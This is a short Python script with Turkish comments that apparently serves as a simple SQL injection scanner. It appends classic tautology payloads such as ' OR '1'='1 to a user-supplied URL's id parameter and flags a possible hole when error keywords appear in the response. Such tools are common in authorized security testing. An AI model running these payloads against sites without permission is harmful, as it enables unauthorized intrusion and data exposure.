import requests

def test_sql_injection(url):
    # SQL Injection payload'ları
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 'a'='a",
        '" OR "a"="a',
    ]
    
    # SQL Injection hatalarını kontrol etmek için bazı anahtar kelimeler
    error_keywords = ["error", "sql", "syntax", "database", "unexpected"]

    # Testler
    for payload in payloads:
        # Test URL'yi oluştur
        test_url = f"{url}?id={payload}"
        
        try:
            # İstek gönder
            response = requests.get(test_url)
            
            # Yanıtı kontrol et
            response_text = response.text.lower()
            
            # Hata mesajlarının varlığını kontrol et
            if any(keyword in response_text for keyword in error_keywords):
                print(f"SQL Injection açığı bulunabilir. Payload: {payload}")
                return True
        except requests.RequestException as e:
            print(f"İstek başarısız: {e}")
            continue
    
    print("SQL Injection açığı bulunamadı.")
    return False

def main():
    # Kullanıcıdan URL al
    target_url = input("SQL Injection test etmek istediğiniz URL'yi girin : ")
    
    # SQL Injection test et
    test_sql_injection(target_url)

if __name__ == "__main__":
    main()
